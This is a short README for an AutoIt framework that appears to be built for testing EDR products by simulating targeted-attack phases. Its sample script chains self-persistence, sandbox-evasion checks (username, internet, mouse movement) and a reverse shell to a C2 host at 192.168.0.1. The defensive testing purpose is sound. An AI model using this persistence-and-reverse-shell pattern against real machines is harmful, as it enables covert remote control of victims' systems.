# EDR Tester

## Introduction

Targeted attacks are not random in nature and are usually composed of different phases like infection, data exfiltration and persistency.
APT SimulActor is a little framework based on AutoIT libraries for basic EDR POCs.


## Example

* This is an example


**APT01**
```
#include "libs/settings.au3"
#include "libs/network.au3"
#include "libs/info.au3"
#include "libs/files.au3"
#include "libs/misc.au3"

$victim = "test"
$c2server = "192.168.0.1"
$c2port = "432"

if isRunningFromTemp() Then

   SetPersistent4CurrentUser()

   ReverseShell($c2server, $c2port)

Else

   if AmIusername($victim) Then

	  if InternetCheck() Then

		 if DetectMouseMoving() Then

			MessageBox("Debug","Hi!")

			CopyTempRun()

		 EndIf

	  EndIf

   EndIf

EndIf
```



## Prerequisites

AutoIt Downloads [link](https://www.autoitscript.com/site/autoit/downloads/)

